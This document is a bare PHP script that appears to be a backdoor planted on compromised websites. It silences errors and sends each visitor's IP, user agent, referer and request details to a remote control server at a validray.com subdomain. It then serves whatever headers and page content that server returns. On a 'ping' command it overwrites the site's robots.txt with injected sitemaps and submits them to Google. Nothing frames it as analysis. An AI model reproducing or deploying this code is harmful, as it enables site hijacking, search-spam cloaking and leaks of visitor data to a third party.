<?php
error_reporting(0);
$gp_name="omb1";
$version="od1";
if ( preg_match("/jp2023/si",$_SERVER["REQUEST_URI"])==1 ) 
{
    header("HTTP/1.0 404 Not Found"); 
    echo "HTTP/1.0 404 Not Found"."___".$gp_name."___".$version; 
    exit; 
}
function curl_get($url)
{
    $ch=curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 10);
    $contents = curl_exec($ch);
    $contents = trim($contents);
    curl_close($ch);
    if ( empty($contents) )
    {
        $contents=file_get_contents($url);
    }
    return $contents;   
}
$domain="http://".$gp_name.".validray.com";
$req_uri="/index.php?VS=".$version."&GP=".$gp_name;
$key_name_arr=array(
"SCRIPT_NAME",
"REQUEST_URI",
"HTTPS",
"REQUEST_SCHEME",
"SERVER_PORT",
"REMOTE_ADDR",
"HTTP_REFERER",
"HTTP_ACCEPT_LANGUAGE",
"HTTP_USER_AGENT",
"HTTP_HOST"
);
foreach($key_name_arr as $key_name)
{
    $key_value=isset($_SERVER[$key_name])?$_SERVER[$key_name]:'';
    $tran_char=base64_encode(trim($key_value));
    $tran_char=str_replace("+","-",$tran_char);
    $tran_char=str_replace("/","_",$tran_char);
    $tran_char=str_replace("=",".",$tran_char);
    $req_uri.="&".$key_name."=".$tran_char;
}
$curl_content_arr=explode("|@#$|",trim(curl_get($domain.$req_uri)));
$count=count($curl_content_arr);
if ($count<3)
{
    header("HTTP/1.0 404 Not Found"); 
    exit;    
}else 
{
    $head_info=trim($curl_content_arr[0]);
    if (!empty($head_info))
    {
        header($head_info);
    }
    $content_info=trim($curl_content_arr[1]);
    if (!empty($content_info))
    {
        echo $content_info;
    }
    $cmd_info=trim($curl_content_arr[$count-1]);
    if ($cmd_info=="exit")
    {
        exit;
    }
    if ($cmd_info=="ping")
    {
        $robots_content="User-agent:*".PHP_EOL;
        $robots_content.="Allow:/".PHP_EOL;
        $ping_url_arr=explode("<br/>",$content_info);
        array_pop($ping_url_arr);
        foreach ($ping_url_arr as $ping_url1)
        {
            $robots_content.="Sitemap:".$ping_url1.PHP_EOL;
            $ping_result=curl_get("https://www.google.com/ping?sitemap=".$ping_url1);
            preg_match("/<h2>(.+)?<\/h2>/",$ping_result,$matches);
            echo $ping_url1."==>ping-google-result-is:<b>".$matches[1]."</b><br/>";
            usleep(mt_rand(100000,300000));
        }
        file_put_contents($_SERVER["DOCUMENT_ROOT"]."/robots.txt",$robots_content);
        echo "robots.txt==><b>updated</b>";
        exit;
    }
}
?>
